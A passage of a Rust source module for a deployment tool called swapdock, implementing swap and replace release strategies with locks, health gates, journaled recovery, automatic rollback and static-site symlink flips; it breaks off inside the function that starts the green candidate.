//! The two swapdock strategies.
//!
//! ```text
//! swap     start the new version alongside the old, flip traffic, retire old
//! replace  stop the old, start the new on the same port
//! ```
//!
//! Which one an app uses is not a flag but a registry fact: `writes_state` forces
//! `replace`, because two containers must never hold one sqlite file open. The
//! validator already refuses `swap` with `writes_state`, so by the time this
//! module runs, the strategy is safe by construction.
//!
//! Both strategies are explicit step sequences. Every step goes through the exec
//! chokepoint or is recorded as a filesystem step, so a failed swapdock leaves a
//! complete trace and `resume` knows where it stopped.
//!
//! ```text
//! swap:    estate-lock → app-lock → resolve → pull → swap-preflight
//!          → green-start → health-wait → render+validate → apply → probe-front
//!          → drain → stop-old → registry-commit
//! replace: estate-lock → app-lock → resolve → pull → render+validate → apply
//!          → stop-old → start-new → health-wait → probe-front → registry-commit
//! ```
//!
//! `rollback` is not a third strategy: it runs the app's own strategy with the
//! previous release, health gate included. Rolling back through the same gate is
//! what makes it trustworthy.

use std::path::{Path, PathBuf};
use std::time::Duration;

use serde_json::{Value, json};
use thiserror::Error;

use crate::apply::{self, ApplyPaths};
use crate::backup;
use crate::compose;
use crate::docker;
use crate::exec::StepSpec;
use crate::git;
use crate::health::{self, HealthError};
use crate::journal;
use crate::lock::{self, Lock, LockError};
use crate::registry::{self, App};
use crate::render;
use crate::static_site;
use crate::trace::{Run, RunMode, StepRecord};

/// Seconds to let old workers drain after the flip before stopping them.
/// nginx closes an old keepalive connection after one more request, so ordinary
/// traffic drains in about a round trip; this covers the tail.
pub const DRAIN_SECS: u64 = 15;

/// Environment variable carrying the image reference into compose.
pub const IMAGE_ENV: &str = "IMAGE";

/// How many times the front door is probed after a flip, and how long between.
///
/// An nginx reload is asynchronous, so one 502 right after it says nothing about
/// the new release. Five seconds is far longer than a worker handover and short
/// enough that a real outage still rolls back.
const FRONT_PROBE_ATTEMPTS: u32 = 10;
const FRONT_PROBE_INTERVAL: Duration = Duration::from_millis(500);

/// Step names of the swap strategy, in order. The run log groups by these, so
/// they are stable identifiers covered by a test.
pub fn swap_steps() -> Vec<&'static str> {
    vec![
        "lock",
        "resolve-release",
        "pull",
        "swap-preflight",
        "green-start",
        "health-wait-discover",
        "health-wait-inspect",
        "health-wait-healthy",
        "health-wait-probe",
        "render-validate",
        "apply-stage",
        "apply-backup",
        "apply-commit",
        "nginx-test",
        "nginx-reload",
        "probe-front",
        "drain-wait",
        "retain-old-image",
        "stop-old",
        "registry-commit",
    ]
}

/// Step names of the replace strategy, in order.
pub fn replace_steps() -> Vec<&'static str> {
    vec![
        "lock",
        "resolve-release",
        "pull",
        "render-validate",
        "apply-stage",
        "apply-backup",
        "apply-commit",
        "nginx-test",
        "nginx-reload",
        "retain-old-image",
        "stop-old",
        "start-new",
        "health-wait-discover",
        "health-wait-inspect",
        "health-wait-healthy",
        "health-wait-probe",
        "probe-front",
        "registry-commit",
    ]
}

/// Everything a strategy run needs that is not the app itself.
#[derive(Debug, Clone)]
pub struct DeployContext {
    pub registry_dir: PathBuf,
    pub state_dir: PathBuf,
    pub lock_dir: PathBuf,
    pub apply_paths: ApplyPaths,
    pub drain_secs: u64,
    pub lock_timeout: Duration,
}

impl Default for DeployContext {
    fn default() -> Self {
        Self {
            registry_dir: PathBuf::from("/srv/swapdock/apps"),
            state_dir: PathBuf::from("/srv/swapdock/green"),
            lock_dir: PathBuf::from("/run/swapdock"),
            apply_paths: ApplyPaths::default(),
            drain_secs: DRAIN_SECS,
            lock_timeout: lock::ACQUIRE_TIMEOUT,
        }
    }
}

/// Why a swapdock did not finish.
#[non_exhaustive]
#[derive(Debug, Error)]
pub enum DeployError {
    #[error("no release to swapdock: pass --release, or record one with a previous swapdock")]
    NoRelease,

    #[error("{0} error(s) in the registry; nothing was started")]
    ValidationFailed(usize),

    #[error("health gate failed: {0}")]
    Health(#[from] HealthError),

    #[error("apply failed: {0}")]
    Apply(#[from] apply::ApplyError),

    #[error("could not find the app's compose file: {0}")]
    Compose(#[from] compose::ComposeFileError),

    #[error("could not take the swapdock lock: {0}")]
    Lock(#[from] LockError),

    #[error("refused to swapdock into a broken estate: {0}")]
    Estate(String),

    #[error(
        "cannot swap {app}: {reasons}. Use strategy = \"replace\" \
         (set writes_state = true when the app owns state) or move the data to bind mounts"
    )]
    SwapUnsafe { app: String, reasons: String },

    #[error("replace of {app} release {release} failed: {failure}; {rollback}")]
    ReplaceFailed {
        app: String,
        release: String,
        failure: String,
        rollback: String,
    },

    #[error("could not stop container {container} publishing port {port}: {stderr}")]
    StopFailed {
        container: String,
        port: u16,
        stderr: String,
    },

    #[error("could not remove the old container {container}: {stderr}")]
    RemoveFailed { container: String, stderr: String },

    #[error("static deploy failed: {0}")]
    Static(#[from] static_site::StaticError),

    #[error("could not write the in-flight deploy record: {0}")]
    Journal(String),

    #[error(
        "refusing to overwrite tag {tag}: it already points at image {existing_image_id}, \
         but the live container {container} is image {live_image_id}. Reconcile the release \
         tags (or the registry's release fields) before deploying; the old container was \
         left running"
    )]
    TagConflict {
        container: String,
        tag: String,
        existing_image_id: String,
        live_image_id: String,
    },

    #[error("sync failed: {0}")]
    Sync(String),

    #[error("could not run a swapdock step: {0}")]
    Exec(#[from] crate::exec::ExecError),

    #[error("could not pull {image_ref}: {stderr}")]
    PullFailed { image_ref: String, stderr: String },

    #[error(
        "{app} release {release} has no local image {image_ref}; \
         run `swapdock build {app} --release {release}` first"
    )]
    ImageMissing {
        app: String,
        release: String,
        image_ref: String,
    },

    #[error("could not write a file: {0}")]
    Io(String),

    #[error("could not write to the run log: {0}")]
    Trace(#[from] anyhow::Error),

    #[error("invalid release {0:?}: must be a commit SHA (hex, 7-64 chars)")]
    InvalidRelease(String),

    #[error("{name} is already on {release}; pass --force to deploy it again")]
    AlreadyLive { name: String, release: String },

    #[error("invalid health path: {0}")]
    InvalidHealthPath(String),

    #[error("backup failed: {0}")]
    Backup(#[from] backup::BackupError),

    #[error("cannot adopt {app}: {reason}")]
    Adopt { app: String, reason: String },
}

/// Decides which commit to swapdock: the flag wins, then the recorded release.
///
/// The chosen value is validated here as well as in the registry: a release
/// reaches a build script and an image tag, so it must be a hex commit name and
/// nothing else.
///
/// The recorded release is the one already live, so deploying it again is
/// refused unless `force`: a bare `up` should not restart a healthy app.
pub fn resolve_release(app: &App, flag: Option<&str>, force: bool) -> Result<String, DeployError> {
    let release = match flag {
        Some(sha) => sha,
        None => app.release.as_deref().ok_or(DeployError::NoRelease)?,
    };
    if !registry::is_valid_release_arg(release) {
        return Err(DeployError::InvalidRelease(release.to_string()));
    }
    if !force && app.release.as_deref() == Some(release) {
        return Err(DeployError::AlreadyLive {
            name: app.name.clone(),
            release: release.to_string(),
        });
    }
    Ok(release.to_string())
}

/// What an app is doing right now, as opposed to what the registry recorded.
///
/// `live_port` and the process behind it can disagree, so the two questions are
/// answered separately: the recorded identity comes from the registry, the
/// verdict from probing the port nginx points at.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LiveStatus {
    pub release: Option<String>,
    pub old_release: Option<String>,
    pub live_port: Option<u16>,
    /// True when the live port answered 2xx.
    pub up: bool,
    /// What it answered with, or `None` when nothing answered at all.
    pub code: Option<u16>,
}

/// Probes the live port over loopback against the app's own health path.
///
/// Spawns no process and opens no run, so it is safe to call unprivileged and
/// from an HTTP handler; a refused connection is a down verdict, not an error.
pub fn live_status(app: &App) -> Result<LiveStatus, DeployError> {
    let mut status = LiveStatus {
        release: app.release.clone(),
        old_release: app.old_release.clone(),
        live_port: app.live_port,
        up: false,
        code: None,
    };
    let Some(port) = app.live_port else {
        return Ok(status);
    };
    let health_url = app.health_url.as_deref().unwrap_or("http://127.0.0.1/");
    let path = health::checked_probe_path(health_url).map_err(DeployError::InvalidHealthPath)?;
    if let Ok(code) = health::http_status("127.0.0.1", port, &path) {
        status.up = (200..300).contains(&code);
        status.code = Some(code);
    }
    Ok(status)
}

/// The generated compose override for a green candidate. Only the container
/// name: ports and image come from the environment, so the main compose file
/// stays the single description of the service.
pub fn green_override(container_name: &str, service: &str) -> String {
    format!("services:\n  {service}:\n    container_name: {container_name}\n")
}

/// Path of the generated override file.
pub fn green_override_path(state_dir: &Path, app: &str) -> PathBuf {
    state_dir.join(format!("{app}.yml"))
}

/// Runs the app's strategy for `release`.
pub fn deploy(
    run: &mut Run,
    ctx: &DeployContext,
    app: &mut App,
    release: &str,
) -> Result<(), DeployError> {
    match app.kind {
        registry::Kind::Static => run_static(run, ctx, app, release),
        registry::Kind::Container => match app.strategy {
            registry::Strategy::Swap => run_swap(run, ctx, app, release),
            registry::Strategy::Replace => run_replace(run, ctx, app, release),
        },
    }
}

/// Rolls back by deploying the previous release through the same strategy.
pub fn rollback(run: &mut Run, ctx: &DeployContext, app: &mut App) -> Result<String, DeployError> {
    let old = app.old_release.clone().ok_or_else(|| {
        DeployError::Estate(format!(
            "{} has no previous release to roll back to",
            app.name
        ))
    })?;
    deploy(run, ctx, app, &old)?;
    Ok(old)
}

/// Fetches the app source and fast-forwards it. Returns the new HEAD.
pub fn sync_repo(run: &mut Run, app: &App) -> Result<String, DeployError> {
    let repo = app.repo.as_ref().ok_or_else(|| {
        DeployError::Sync(format!("{} has no repo recorded; set repo first", app.name))
    })?;
    let branch = app.git_branch();

    if !repo.join(".git").exists() {
        let remote = app.git_remote.as_ref().ok_or_else(|| {
            DeployError::Sync(format!("{} has no git_remote to clone from", app.name))
        })?;
        let url = format!("https://github.com/{remote}.git");
        let spec = git::clone_branch(&url, branch, repo);
        let outcome = run.exec(&spec)?;
        if !outcome.success() {
            return Err(DeployError::Sync(format!(
                "clone failed: {}",
                outcome.stderr_trimmed()
            )));
        }
    }

    // Refuse to touch a dirty checkout: uncommitted work on the server would be
    // merged over or, worse, deployed.
    let status = run.exec(&git::status_porcelain(repo))?;
    if !status.stdout_trimmed().is_empty() {
        return Err(DeployError::Sync(format!(
            "{} has uncommitted changes; commit or stash them first",
            repo.display()
        )));
    }

    let fetch = run.exec(&git::fetch(repo, branch))?;
    if !fetch.success() {
        return Err(DeployError::Sync(format!(
            "fetch failed: {}",
            fetch.stderr_trimmed()
        )));
    }
    let sha = run
        .exec(&git::rev_parse(repo, branch))?
        .stdout_trimmed()
        .to_string();
    let merge = run.exec(&git::merge_ff_only(repo, branch))?;
    if !merge.success() {
        return Err(DeployError::Sync(format!(
            "fast-forward failed (the server history diverged): {}",
            merge.stderr_trimmed()
        )));
    }
    Ok(sha)
}

// ---------------------------------------------------------------------------
// swap
// ---------------------------------------------------------------------------

/// Deploys by starting the new release alongside the old one.
pub fn run_swap(
    run: &mut Run,
    ctx: &DeployContext,
    app: &mut App,
    release: &str,
) -> Result<(), DeployError> {
    // Estate then app, always in that order. The estate lock is held through
    // registry-commit, so a second deploy cannot render this app's pre-commit
    // live_port and then apply a stale config after this one commits.
    let _estate_lock = hold(run, ctx, lock::estate_lock_name())?;
    let _app_lock = hold(run, ctx, &lock::app_lock_name(&app.name))?;
    reload_app(ctx, app)?;
    refuse_if_broken(run, ctx)?;
    backup::before_deploy(run, app, Some(release))?;

    // Without a live port there is nothing to alternate against: a first swapdock
    // starts on the pair's first port.
    let green_port = match app.live_port {
        Some(live) => {
            crate::ports::other(app.slot, live).map_err(|e| DeployError::Estate(e.to_string()))?
        }
        None => crate::ports::pair(app.slot)
            .map(|(a, _)| a)
            .map_err(|e| DeployError::Estate(e.to_string()))?,
    };

    pull_image(run, app, release)?;
    preflight_swap(run, app)?;

    // The release being replaced is what is live now, *before* commit_release
    // advances the chain. It is not `old_release`: on a rollback that is the
    // target, and tagging the outgoing image with it would overwrite the very
    // tag the rollback is deploying.
    let replaced = app.release.clone();

    let green_name = format!("{}-green-{}", app.compose_svc, short_sha(release));
    start_green(run, ctx, app, release, green_port, &green_name)?;

    let health_path =
        health::checked_probe_path(app_health_url(app)).map_err(DeployError::InvalidHealthPath)?;
    health::gate_container_with_host(
        run,
        "health-wait",
        green_port,
        &health_path,
        app.hostnames.first().map(String::as_str),
    )?;

    let mut pending = journal::Pending::new(
        app.name.clone(),
        release,
        app.live_port,
        green_port,
        run.id().to_string(),
    );
    if run.mode() != RunMode::DryRun {
        journal::write(&ctx.state_dir, &pending)
            .map_err(|e| DeployError::Journal(e.to_string()))?;
    }

    apply_new_state(run, ctx, app, green_port)?;
    pending.phase = journal::Phase::Flipped;
    if run.mode() != RunMode::DryRun {
        journal::write(&ctx.state_dir, &pending)
            .map_err(|e| DeployError::Journal(e.to_string()))?;
    }

    #[cfg(debug_assertions)]
    if std::env::var("SWAPDOCK_FAILPOINT").ok().as_deref() == Some("swap-flipped") {
        return Err(DeployError::Estate(
            "failpoint: process would have died after the swap flip".into(),
        ));
    }

    if let Err(failure) = probe_front(run, app) {
        return Err(rollback_swap_candidate(
            run, ctx, app, release, green_port, failure,
        ));
    }

    if let Err(failure) = drain(run, ctx) {
        return Err(rollback_swap_candidate(
            run, ctx, app, release, green_port, failure,
        ));
    }

    if let Err(failure) = retain_old_image(run, app, replaced.as_deref(), release) {
        return Err(rollback_swap_candidate(
            run, ctx, app, release, green_port, failure,
        ));
    }

    pending.phase = journal::Phase::Stopping;
    if run.mode() != RunMode::DryRun {
        journal::write(&ctx.state_dir, &pending)
            .map_err(|e| DeployError::Journal(e.to_string()))?;
    }
    stop_publishing(run, app.live_port)?;
    if let Some(previous) = replaced.as_deref() {
        cleanup_green_project(run, ctx, app, previous)?;
    }

    commit_release(run, ctx, app, release.to_string(), green_port)?;
    if run.mode() != RunMode::DryRun
        && let Err(e) = journal::clear(&ctx.state_dir, &app.name)
    {
        tracing::warn!(app = %app.name, "could not clear pending deploy record: {e}");
    }
    Ok(())
}

/// Removes a per-release green Compose project and its network after its
/// container is no longer live. Without this every swap leaks a Docker network
/// named `<project>-green-<sha>_default`.
fn cleanup_green_project(
    run: &mut Run,
    _ctx: &DeployContext,
    app: &App,
    release: &str,
) -> Result<(), DeployError> {
    let compose_file = compose::resolve_compose_file(&app.compose_dir)?;
    let project = format!("{}-green-{}", app.compose_project(), short_sha(release));
    let outcome = run.exec(&compose::down(&compose_file, &project, &[]))?;
    if !outcome.success() {
        tracing::warn!(
            app = %app.name,
            project = %project,
            "green project cleanup failed: {}",
            outcome.stderr_trimmed()
        );
    }
    Ok(())
}

fn rollback_swap_candidate(
    run: &mut Run,
    ctx: &DeployContext,
    app: &App,
    release: &str,
    green_port: u16,
    failure: DeployError,
) -> DeployError {
    rollback_swap_candidate_inner(run, ctx, app, release, green_port, failure)
}

/// Puts the front door back on the old release, stops the failed candidate and
/// clears the journal. Called for every post-flip swap failure.
fn rollback_swap_candidate_inner(
    run: &mut Run,
    ctx: &DeployContext,
    app: &App,
    release: &str,
    green_port: u16,
    failure: DeployError,
) -> DeployError {
    if let Some(old_live) = app.live_port
        && let Err(restore) = apply_new_state(run, ctx, app, old_live)
    {
        return DeployError::Estate(format!(
            "{failure}; restoring the previous front door also failed: {restore}"
        ));
    }
    if let Err(stop) = stop_publishing(run, Some(green_port)) {
        return DeployError::Estate(format!(
            "{failure}; the failed candidate on {green_port} could not be stopped: {stop}"
        ));
    }
    if let Err(e) = cleanup_green_project(run, ctx, app, release) {
        tracing::warn!(app = %app.name, "failed green project cleanup: {e}");
    }
    if let Err(e) = journal::clear(&ctx.state_dir, &app.name) {
        tracing::warn!(app = %app.name, "could not clear pending record after swap rollback: {e}");
    }
    failure
}

// ---------------------------------------------------------------------------
// replace
// ---------------------------------------------------------------------------
//
/// Deploys by stopping the old container and starting the new on the same port.
pub fn run_replace(
    run: &mut Run,
    ctx: &DeployContext,
    app: &mut App,
    release: &str,
) -> Result<(), DeployError> {
    let _estate_lock = hold(run, ctx, lock::estate_lock_name())?;
    let _app_lock = hold(run, ctx, &lock::app_lock_name(&app.name))?;
    reload_app(ctx, app)?;
    refuse_if_broken(run, ctx)?;
    backup::before_deploy(run, app, Some(release))?;

    let port = app.live_port.ok_or_else(|| {
        DeployError::Estate(format!(
            "{} has no live_port yet; a first swapdock must use swap",
            app.name
        ))
    })?;

    pull_image(run, app, release)?;

    // What is live at the moment the old container is stopped. This is the
    // release `retain_old_image` preserves and the one an automatic rollback
    // restarts if the new release cannot pass the gate.
    let previous = app.release.clone();

    let mut pending = journal::Pending::new(
        app.name.clone(),
        release,
        app.live_port,
        port,
        run.id().to_string(),
    );
    if run.mode() != RunMode::DryRun {
        journal::write(&ctx.state_dir, &pending)
            .map_err(|e| DeployError::Journal(e.to_string()))?;
    }

    // The port does not change, so the rendered config is identical. Skip the
    // reload rather than bounce every worker for no reason.
    if config_changed(ctx, app, port)? {
        apply_new_state(run, ctx, app, port)?;
    } else {
        record_skip(run, "apply-skipped", "rendered config identical; no reload")?;
    }
    pending.phase = journal::Phase::Flipped;
    if run.mode() != RunMode::DryRun {
        journal::write(&ctx.state_dir, &pending)
            .map_err(|e| DeployError::Journal(e.to_string()))?;
    }

    retain_old_image(run, app, previous.as_deref(), release)?;

    pending.phase = journal::Phase::Stopping;
    if run.mode() != RunMode::DryRun {
        journal::write(&ctx.state_dir, &pending)
            .map_err(|e| DeployError::Journal(e.to_string()))?;
    }
    stop_publishing(run, Some(port))?;

    let health_path =
        health::checked_probe_path(app_health_url(app)).map_err(DeployError::InvalidHealthPath)?;
    let host = app.hostnames.first().map(String::as_str);

    let started = start_live(run, app, release, port).and_then(|()| {
        health::gate_container_with_host(run, "health-wait", port, &health_path, host)
            .map(|_| ())
            .map_err(DeployError::from)
    });

    if let Err(failure) = started {
        return Err(replace_failure(
            run,
            ctx,
            app,
            release,
            previous.as_deref(),
            port,
            &health_path,
            host,
            failure,
        ));
    }

    if let Err(failure) = probe_front(run, app) {
        return Err(replace_failure(
            run,
            ctx,
            app,
            release,
            previous.as_deref(),
            port,
            &health_path,
            host,
            failure,
        ));
    }

    commit_release(run, ctx, app, release.to_string(), port)?;
    if run.mode() != RunMode::DryRun
        && let Err(e) = journal::clear(&ctx.state_dir, &app.name)
    {
        tracing::warn!(app = %app.name, "could not clear pending deploy record: {e}");
    }
    Ok(())
}

/// Deploys a static release by verifying its directory and atomically flipping
/// the stable `root` symlink.
///
/// The release files are produced outside this function (CI, rsync, or a build
/// script) at `<root-parent>/releases/<release>/index.html`. swapdock owns the
/// cutover: it refuses a missing release, flips the link, applies nginx, probes
/// the public front door, and restores the previous link if the probe fails.
/// There is no container and no image.
fn run_static(
    run: &mut Run,
    ctx: &DeployContext,
    app: &mut App,
    release: &str,
) -> Result<(), DeployError> {
    let _estate_lock = hold(run, ctx, lock::estate_lock_name())?;
    let _app_lock = hold(run, ctx, &lock::app_lock_name(&app.name))?;
    reload_app(ctx, app)?;
    refuse_if_broken(run, ctx)?;
    backup::before_deploy(run, app, Some(release))?;

    let root = app
        .root
        .as_deref()
        .ok_or_else(|| DeployError::Estate(format!("{} has no static root", app.name)))?;
    let root = PathBuf::from(root);
    let release_dir = static_site::release_dir(&root, release)?;

    if run.mode() == RunMode::DryRun {
        record_skip(
            run,
            "static-release",
            &format!("dry-run: would verify {}", release_dir.display()),
        )?;
        record_skip(
            run,
            "static-flip",
            &format!(
                "dry-run: would link {} -> releases/{release}",
                root.display()
            ),
        )?;
        apply_new_state(run, ctx, app, app.front_port)?;
        probe_front(run, app)?;
        commit_release(run, ctx, app, release.to_string(), app.front_port)?;
        return Ok(());
    }

    static_site::ensure_release(&root, release)?;
    let seq = run.next_seq();
    run.record_step(
        StepRecord::new(
            seq,
            "static-release",
            crate::trace::StepStatus::Ok,
            &["verify".to_string(), release_dir.display().to_string()],
        )
        .with_detail(json!({"release": release, "directory": release_dir})),
    )?;

    // The pending record makes a kill between the flip and the commit visible.
    // It is written before the symlink moves; a failure to persist it aborts
    // before any host state changes.
    let pending = journal::Pending::new(
        app.name.clone(),
        release,
        app.live_port,
        app.front_port,
        run.id().to_string(),
    );
    journal::write(&ctx.state_dir, &pending).map_err(|e| DeployError::Journal(e.to_string()))?;

    let previous_link = match static_site::flip(&root, release) {
        Ok(previous) => previous,
        Err(e) => {
            // No host state changed; do not leave a pending record claiming a
            // cutover that never happened.
            let _ = journal::clear(&ctx.state_dir, &app.name);
            return Err(e.into());
        }
    };
    let previous_release = app.release.clone();
    let seq = run.next_seq();
    run.record_step(
        StepRecord::new(
            seq,
            "static-flip",
            crate::trace::StepStatus::Ok,
            &[
                "symlink".to_string(),
                root.display().to_string(),
                format!("releases/{release}"),
            ],
        )
        .with_detail(json!({
            "release": release,
            "previous": previous_release,
            "previous_link": previous_link.as_ref().map(|p| p.display().to_string()),
        })),
    )?;

    // Test-only crash point: leave the new symlink and pending record in place
    // exactly as a killed process would, without the normal restore path.
    #[cfg(debug_assertions)]
    if std::env::var("SWAPDOCK_FAILPOINT").ok().as_deref() == Some("static-flipped") {
        return Err(DeployError::Estate(
            "failpoint: process would have died after the static flip".into(),
        ));
    }

    // From here the new files are live. Every failure restores the link and
    // reports both errors; the registry is only committed after the probe.
    let result = (|| {
        apply_new_state(run, ctx, app, app.front_port)?;
        probe_front(run, app)?;
        commit_release(run, ctx, app, release.to_string(), app.front_port)?;
        Ok::<(), DeployError>(())
    })();

    match result {
        Ok(()) => {
            if let Err(e) = journal::clear(&ctx.state_dir, &app.name) {
                tracing::warn!(app = %app.name, "could not clear pending deploy record: {e}");
            }
            Ok(())
        }
        Err(failure) => {
            // `commit_release` advances the in-memory app before it saves and
            // records the step. If the registry was already saved and only the
            // run-log write failed, restoring the old symlink would make nginx
            // disagree with the registry. Check the durable file, not the
            // in-memory app.
            if app.release.as_deref() == Some(release)
                && registry_has_release(ctx, &app.name, release)
            {
                let _ = journal::clear(&ctx.state_dir, &app.name);
                return Err(failure);
            }
            let restored = static_site::restore(&root, previous_link.as_deref());
            if restored.is_ok() {
                let _ = journal::clear(&ctx.state_dir, &app.name);
                return Err(failure);
            }
            Err(DeployError::Estate(format!(
                "{failure}; restoring the previous static release also failed: {}",
                restored.unwrap_err()
            )))
        }
    }
}

/// Restarts the previous release after a failed `replace`, then names both
/// failures in one error.
///
/// The registry was not committed, so the recorded state still describes the
/// previous release; restarting its image on the same port makes the running
/// state agree with the registry again.
#[allow(clippy::too_many_arguments)]
fn replace_failure(
    run: &mut Run,
    ctx: &DeployContext,
    app: &App,
    release: &str,
    previous: Option<&str>,
    port: u16,
    health_path: &str,
    host: Option<&str>,
    failure: DeployError,
) -> DeployError {
    let rollback = match previous {
        Some(previous) => match restore_previous(run, app, previous, port, health_path, host) {
            Ok(()) => {
                // The failed release never reached the registry. Leaving the
                // pending record would make a later startup reconcile consider
                // it; the old release is healthy again, so the crash window is
                // closed.
                if let Err(e) = journal::clear(&ctx.state_dir, &app.name) {
                    tracing::warn!(app = %app.name, "could not clear pending record after replace rollback: {e}");
                }
                format!(
                    "the previous release {previous} was restored and passed the same health gate"
                )
            }
            Err(rollback) => format!("rollback to {previous} ALSO failed: {rollback}"),
        },
        None => "there is no previous release to roll back to".to_string(),
    };
    DeployError::ReplaceFailed {
        app: app.name.clone(),
        release: release.to_string(),
        failure: failure.to_string(),
        rollback,
    }
}

/// Starts `previous` on the same port and waits for the same health gate.
fn restore_previous(
    run: &mut Run,
    app: &App,
    previous: &str,
    port: u16,
    health_path: &str,
    host: Option<&str>,
) -> Result<(), DeployError> {
    let result = start_live(run, app, previous, port).and_then(|()| {
        health::gate_container_with_host(run, "health-wait", port, health_path, host)
            .map(|_| ())
            .map_err(DeployError::from)
    });

    let seq = run.next_seq();
    let argv = ["rollback".to_string(), previous.to_string()];
    let record = match &result {
        Ok(()) => StepRecord::new(seq, "replace-rollback", crate::trace::StepStatus::Ok, &argv)
            .with_detail(json!({"release": previous, "port": port})),
        Err(e) => StepRecord::new(
            seq,
            "replace-rollback",
            crate::trace::StepStatus::Error,
            &argv,
        )
        .with_detail(json!({"release": previous, "port": port}))
        .with_error(e.to_string()),
    };
    run.record_step(record).map_err(DeployError::Trace)?;
    result
}

// ---------------------------------------------------------------------------
// shared steps
// ---------------------------------------------------------------------------

fn app_health_url(app: &App) -> &str {
    app.health_url.as_deref().unwrap_or("http://127.0.0.1/")
}

/// Takes a lock, or records the intent in dry-run mode.
fn hold(run: &mut Run, ctx: &DeployContext, name: &str) -> Result<Option<Lock>, DeployError> {
    if run.mode() == RunMode::DryRun {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(
                seq,
                "lock",
                crate::trace::StepStatus::DryRun,
                &[
                    "lock".to_string(),
                    ctx.lock_dir
                        .join(format!("{name}.lock"))
                        .display()
                        .to_string(),
                ],
            )
            .with_detail(json!({"lock": name})),
        )?;
        return Ok(None);
    }
    Ok(Some(Lock::acquire(&ctx.lock_dir, name, ctx.lock_timeout)?))
}

/// Reloads the app from the registry under the estate and app locks.
///
/// The caller loaded its snapshot before waiting for the locks. Without this
/// re-read, a second deploy of the same app computes the green port from the
/// pre-lock `live_port` and can recreate the serving container instead of
/// alternating against it. The fresh copy replaces the passed value so the
/// commit below writes the state this run actually saw.
fn reload_app(ctx: &DeployContext, app: &mut App) -> Result<(), DeployError> {
    let loaded = registry::load_dir(&ctx.registry_dir)
        .map_err(|e| DeployError::Io(format!("read {}: {e}", ctx.registry_dir.display())))?;
    let fresh = loaded
        .sorted()
        .into_iter()
        .find(|a| a.name == app.name)
        .ok_or_else(|| DeployError::Estate(format!("{} vanished from the registry", app.name)))?;
    *app = fresh;
    Ok(())
}

/// Refuses a swap whose merged Compose model cannot survive a new project.
fn preflight_swap(run: &mut Run, app: &App) -> Result<(), DeployError> {
    if run.mode() == RunMode::DryRun {
        record_skip(
            run,
            "swap-preflight",
            "dry-run cannot inspect the merged compose model; a live swap would check named \
             volumes and service dependencies first",
        )?;
        return Ok(());
    }

    let compose_file = compose::resolve_compose_file(&app.compose_dir)?;
    let extra: Vec<&Path> = app.compose_override.as_deref().into_iter().collect();
    let out = run.exec(&compose::config_json(
        &compose_file,
        &app.compose_project(),
        &extra,
        &app.compose_svc,
    ))?;
    if !out.success() {
        return Err(DeployError::Estate(format!(
            "swap preflight could not read the merged compose model for {}: {}",
            app.name,
            out.stderr_trimmed()
        )));
    }
    let config: Value = serde_json::from_str(out.stdout_trimmed()).map_err(|e| {
        DeployError::Estate(format!(
            "swap preflight: `docker compose config` did not return JSON for {}: {e}",
            app.name
        ))
    })?;
    let blockers = compose::swap_blockers(&config, &app.compose_svc);
    if !blockers.is_empty() {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(
                seq,
                "swap-preflight",
                crate::trace::StepStatus::Error,
                &["compose-config".to_string()],
            )
            .with_detail(json!({"blockers": blockers})),
        )?;
        return Err(DeployError::SwapUnsafe {
            app: app.name.clone(),
            reasons: blockers.join("; "),
        });
    }

    let seq = run.next_seq();
    run.record_step(
        StepRecord::new(
            seq,
            "swap-preflight",
            crate::trace::StepStatus::Ok,
            &["compose-config".to_string()],
        )
        .with_detail(json!({"service": app.compose_svc})),
    )?;
    Ok(())
}

/// Refuses to swapdock into an estate that does not validate.
fn refuse_if_broken(run: &mut Run, ctx: &DeployContext) -> Result<(), DeployError> {
    let loaded = registry::load_dir(&ctx.registry_dir)
        .map_err(|e| DeployError::Io(format!("read {}: {e}", ctx.registry_dir.display())))?;
    let mut problems = loaded.problems.clone();
    for a in &loaded.apps {
        problems.extend(a.problems());
    }
    problems.extend(crate::validator::validate(
        &loaded.sorted(),
        &crate::validator::TunnelRoutes::new(),
    ));
    let errors: Vec<_> = problems.iter().filter(|p| p.is_error()).collect();
    if !errors.is_empty() {
        let seq = run.next_seq();
        run.record_step(
            StepRecord::new(
                seq,
                "refuse-broken-estate",
                crate::trace::StepStatus::Ok,
                &["validate".to_string()],
            )
            .with_detail(json!({"errors": errors.len()})),
        )?;
        return Err(DeployError::ValidationFailed(errors.len()));
    }
    Ok(())
}

/// Pulls the release image, unless it is local-only.
fn pull_image(run: &mut Run, app: &App, release: &str) -> Result<(), DeployError> {
    let Some(image_ref) = app.image_ref(release) else {
        record_skip(run, "pull", "no image_repo; nothing to pull")?;
        return Ok(());
    };
    if !app.needs_pull() {
        if run.mode() == RunMode::DryRun {
            record_skip(
                run,
                "pull",
                &format!("{image_ref} is local; would verify it exists"),
            )?;
            return Ok(());
        }
        // Compose is invoked with --no-build, but checking here turns a
        // generic compose failure into an actionable "build it first" error.
        // It also stops a stale checkout from being auto-built and tagged as
        // a release it does not contain.
        let exists = run.exec(&docker::image_exists(&image_ref))?;
        if !exists.success() {
            return Err(DeployError::ImageMissing {
                app: app.name.clone(),
                release: release.to_string(),
                image_ref,
            });
        }
        record_skip(run, "pull", &format!("{image_ref} is local and present"))?;
        return Ok(());
    }
    let outcome = run.exec(&docker::pull(&image_ref))?;
    if !outcome.success() {
        return Err(DeployError::PullFailed {
            image_ref,
            stderr: outcome.stderr_trimmed().to_string(),
        });
    }
    Ok(())
}

/// Starts the green candidate in its own compose project.
fn start_green(
    run: &mut Run,
    ctx: &DeployContext,
    app: &App,
    release: &str,
    green_port: u16,
    green_name: &str,
) -> Result<(), DeployError> {
    let override_path = green_override_path(&ctx.state_dir, &app.name);
    let text = green_override(green_name, &app.compose_svc);
    write_state_file(run, &override_path, &text)?;

    let compose_file = compose::resolve_compose_file(&app.compose_dir)?;
    // One Compose project per green release. Sharing a project makes Compose
    // treat the previous green service as the same desired state and remove it
    // before the new release passes health/probe, destroying the keep-old
    // guarantee. Per-release projects leave the previous container alone until
    // stop_publishing() stops it after the cutover.
    let project = format!("{}-green-{}", app.compose_project(), short_sha(release));
    let image = app.image_ref(release).unwrap_or_default();
    let port_var = app.env_name.clone();
    let mut extra: Vec<&Path> = Vec::new();
    if let Some(path) = &app.compose_override {
        extra.push(path);
    }
    extra.push(override_path.as_path());
    let mut spec = compose::up_detached(&compose_file, &project, &extra, &app.compose_svc);
    spec = spec
        .env(port_var, green_port.to_string())
